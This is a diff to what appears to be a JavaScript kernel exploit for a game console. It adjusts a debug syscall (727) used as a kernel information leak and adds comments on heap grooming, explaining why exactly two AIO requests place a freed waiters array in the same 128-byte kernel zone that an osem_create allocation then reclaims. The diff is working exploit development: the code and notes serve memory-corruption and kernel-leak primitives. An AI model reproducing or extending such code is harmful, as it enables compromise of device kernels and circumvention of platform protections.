@@ -26,7 +26,9 @@
 //   aio_submit_cmd(cmd, reqs*, num_reqs, priority, ids*)    [0x29D]
 //   aio_multi_cancel(ids*, num_ids, states*)                [0x29A]
 //   aio_multi_delete(ids*, num_ids, states*)                [0x296]
-//   aio_debug_request_info(id, dst*, ?)                     [0x2D7 = 727]
+//   aio_debug_request_info(id, dst*, count)                 [0x2D7 = 727]
+//     (spec: count bounded [1, table->0x228]; count=0 -> EINVAL on console.
+//      Adaptive: try count=1 first, retry with 0 if EINVAL.)
 //   osem_create(name*,attr,val,max,opt*) [0x225] osem_delete(id) [0x226]
 //   osem_trywait(id) [0x22A]  osem_post(id) [0x22B]   (osem2_1320.js)
 //   AIO_CMD_MULTI_READ = 0x1001
@@ -95,6 +97,11 @@
     const AIO_CMD_MULTI_READ = 0x1001n;
 
     // Number of requests. Spec: num>=2, mode 0 -> all requests get node 0.
+    // WHY EXACTLY 2: the waiters array is num*0x38 bytes; at num=2 that is
+    // 0x70 -> kernel 128 zone, the SAME zone as osem_create's malloc(0x60)
+    // (spec section 4). num=3/4 gives 0xA8/0xE0 -> 256 zone -> the osem
+    // reclaim would MISS the freed block. Do not raise NREQ without
+    // rethinking the reclaim primitive.
     const NREQ = 2;
     const NODE_BYTES = 0x38;   // waiter node size
     const REQ_BYTES = 0x28;    // request size (lapse make_reqs1)
@@ -142,17 +149,26 @@
         return;
     }
 
-    // 727 leak helper: copies kernel info about request id into buffer dst
+    // 727 leak helper: copies kernel info about request id into buffer dst.
+    // count (arg2) is bounded [1, table->0x228] per the spec: 0 is out of the
+    // bound on console (EINVAL). If arg2 turned out to be flags on this fw,
+    // 0 would be the neutral value -> adaptive: first call tries count=1
+    // (spec-shaped); on EINVAL it retries once with 0 and remembers which.
+    let cnt727 = null;
     const leakBuf = malloc(32);
     const leak727 = (id, phase) => {
         if (!leakOK) return null;
-        const q = SC("AIO_DEBUG727_" + phase, A_DEBUG, [B(id), leakBuf, 0n],
-            "(id=" + FX(id) + ",dst)");
-        if (q.ex) { leakOK = false; return null; }
-        if (q.r < 0n) {
-            if (q.e === 78) leakOK = false;   // missing: switch the channel off
-            return null;
+        let q = null;
+        for (const c of (cnt727 === null ? [1n, 0n] : [cnt727])) {
+            q = SC("AIO_DEBUG727_" + phase, A_DEBUG, [B(id), leakBuf, c],
+                "(id=" + FX(id) + ",dst,count=" + c + ")");
+            if (q.ex) { leakOK = false; return null; }
+            if (q.r >= 0n) { cnt727 = c; break; }
+            if (q.e === 78) { leakOK = false; return null; }
+            if (q.e === 22 && cnt727 === null) continue;  // EINVAL: other count
+            break;
         }
+        if (q.r < 0n) return null;
         return [read64(leakBuf), read64(leakBuf + 8n), read64(leakBuf + 16n)];
     };
 
